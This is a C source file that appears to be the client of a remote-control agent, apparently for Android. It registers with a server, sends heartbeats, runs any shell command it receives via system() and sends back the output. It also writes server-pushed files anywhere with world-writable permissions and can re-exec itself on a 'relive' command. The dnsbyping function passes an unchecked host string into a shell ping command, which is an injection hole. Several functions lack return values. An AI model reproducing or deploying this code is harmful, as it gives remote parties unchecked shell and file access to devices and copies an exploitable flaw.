#include "../include/toolsfun.h"
#include "../include/contain.h"
#include <unistd.h>
#include "../include/configx.h"
#include "../include/socket_control.h"
#include "../include/project_head.h"
#include "../include/pthreadxsx.h"
#include <fcntl.h>
#include "../include/encrypt.h"
#define _GNU_SOURCE

extern int extid;

int linkbash()
{
	int red = mkdir("/bin",777);
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	red = symlink("/system/bin/sh","/bin/sh");
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	return true;
}

int report(int ans,int sock, int loglen)
{
	U_MSG k;
	k.type = T_ANSWR;
	k.answer_m.id = extid;
	k.answer_m.torf = ans;
	k.answer_m.loglen = loglen;
	
	int n = sendpt(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
	{
		perror("write err");
		return false;
	}
}

int xsystem(char* shellbuf, int sock)
{
	int pipefd[2], loop, loop2, size= 0, si= 0;
	int fdback[2];
	fdback[0] = dup(STDOUT_FILENO);
	fdback[1] = dup(STDERR_FILENO);
	pipe(pipefd);
	int fd = dup2(pipefd[1], STDOUT_FILENO);
	fd = dup2(pipefd[1], STDERR_FILENO);
	system(shellbuf);
/*	char buf[4096];
	int m, n;
	while((m = read(pipefd[0], buf, 4096)) > 0)
		if( (n = write(sock, buf, m)) < 0)
			break;
*/
	char* buf[20] = {0};
	for(loop = 0; loop<20; loop++)
	{
		buf[loop] = (char*)malloc(4096);
		si = read(pipefd[0], buf[loop], 4096);
		write(2, &si, 4);
		write(2, buf[loop], si);
		size+=si;
		if(si!=4096)
		{
			loop++;
			break;
		}
	}
	dup2(fdback[0], STDOUT_FILENO);
	dup2(fdback[1], STDERR_FILENO);

	int ans = report(1,sock,size);
	if(ans == false)
		return false;
	for(loop2 = 0; loop2<loop; loop2++)
	{
		if(loop2 == loop-1)
			sendpt(sock, buf[loop2], si);
		else
			sendpt(sock, buf[loop2], 4096);
		free(buf[loop2]);
	}

	
}

int waiting(int sock)
{
	U_MSG k;
	while(1)
	{
		int n = recvpt(sock,&k,sizeof(U_MSG));
		if(n!=sizeof(U_MSG))
		{
			perror("read err");
			return false;
		}
		switch(k.type)
		{
			case T_SHELL:
			{	
				char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
				memset(shellbuf,0,k.shell_m.commandlen+1);
				n = recvpt(sock,shellbuf,k.shell_m.commandlen);
				if(n!=k.shell_m.commandlen)
				{
					perror("read err");
					free(shellbuf);
					return false;
				}
				if(strcmp(shellbuf, "relive") == 0)
				{
					close(sock);
					execl("./main", "main", NULL);
				}
				else
				{
					xsystem(shellbuf, sock);
					free(shellbuf);					
				}
				break;
			}
			case T_TFILE:
			{
				char *tfilebuf = (char*)malloc(k.tfile_m.path+1);
				memset(tfilebuf,0,k.tfile_m.path+1);
				n = recvpt(sock,tfilebuf,k.tfile_m.path);
				if(n!=k.tfile_m.path)
				{
					perror("read err");
					free(tfilebuf);
					return false;
				}
				int fd = r_creatfile(tfilebuf);
				if(fd == -1)
				{
					int ans = report(0,sock,0);
					if(ans == false)
						return false;
					free(tfilebuf);
					continue;
				}
				int ans = report(1,sock,0);
				if(ans == false)
					return false;
				char buffile[4096] = {0};
				int m=0, n, o;
				while((o = read(sock, buffile, 4096)) > 0)
				{
					if( (n = write(fd, buffile, o)) < 0)
						break;
					if( (m=m+o) == k.tfile_m.size )
						break;
				}
/*				
				int ret;
				if(k.tfile_m.size > 4096)
				{
					int times = k.tfile_m.size / 4096;
					if(k.tfile_m.size%4096 != 0)
						times += 1;
					int i = 0;
					DEBUGW;
					for (; i < times; ++i)
					{
						if( (i == times-1) && ( k.tfile_m.size%4096 != 0) )
							ret = recvpt(sock, buffile, k.tfile_m.size%4096);
						else
							ret = recvpt(sock, buffile, 4096);
						if(ret < 0)
						{
							DEBUGW;
							break;
						}
						write(fd, buffile, ret);
					}
					DEBUGW;
				}
				else
				{
					DEBUGW;
					ret = recvpt(sock, buffile, k.tfile_m.size);
					if(ret <= 0)
						break;
					write(fd, buffile, ret);
				}
				DEBUGW;*/
				close(fd);
			}
			default:
				break;
		}
	}	
}



void* ping_pthread(void * argument)
{
	char* shell =(char*)argument;
	system(shell);
}


int dnsbyping(char* ip)
{
	if( atoi(ip) != 0 )
		return true;
	char *filename = "tmp.txt";
	char newip[30] = {0};
	char ping[40] = {0};
	sprintf(ping,"ping %s > %s",ip,filename);
	//pthread_t pid = pthread_run(ping_pthread,ping);
	//sleep(2);
	//pthread_cancel(pid);
	//pthread_join(pid,NULL);


	popen(ping, "r");
	int filefd = open(filename,O_RDWR);
	if(filefd == -1)
	{
		return false;
	}
	char buf[100] = {0};
	char *pr = buf;
	int res = 0;
	while( 1 )
	{
		res = read(filefd,pr,1);
		if(res != 1)
			return false;
		if(*pr != ')')
			pr++;
		else
			break;
	}
	close(filefd);
	unlink(filename);
	*pr = 0;
	pr = strchr(buf,'(');
	if(pr == NULL)
		return false;
	pr++;
	strcpy(ip,pr);
	return true;
}

int r_creatfile(char * path)
{
	int i=  0;
	for (; i < 2; ++i)
	{
		int red = open(path,O_RDWR|O_CREAT|O_TRUNC,0777);
		if(red == -1)
		{
			if( errno != ENOENT)
				return -1;
			char * pr = strrchr(path,'/');
			if(pr == path)
				return 0;
			char newpath[50] = {0};
			memcpy(newpath, path, pr-path);
			printf("%s\n", newpath);
			r_mkdir(newpath);
		}
		else
			return red;
	}
	return 0;	
}


int r_mkdir(char * path)
{
	int i=  0;
	for (; i < 2; ++i)
	{
		int red = mkdir(path,0777);
		if(red == -1)
		{
			if( errno != ENOENT)
				return -1;
			char * pr = strrchr(path,'/');
			if(pr == path)
				return 0;
			char newpath[50] = {0};
			memcpy(newpath, path, pr-path);
			printf("%s\n", newpath);
			r_mkdir(newpath);
		}
		else
			return 0;
	}
	return 0;
}


int rgist(int sock)
{
	U_MSG k;
	k.regist_m.type = T_REGST;
	k.regist_m.id = 0;
	int n = sendpt(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	n = recvpt(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	extid = k.regist_m.id;
	char idchr[6] = {0};
	sprintf(idchr, "%d", extid);
	wrcfg("id", idchr);
	return k.regist_m.id;
}


int beatheart(int sock)
{
	U_MSG k;
	k.regist_m.type = T_HEART;
	k.regist_m.id = extid;
	int n = sendpt(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	return true;
}
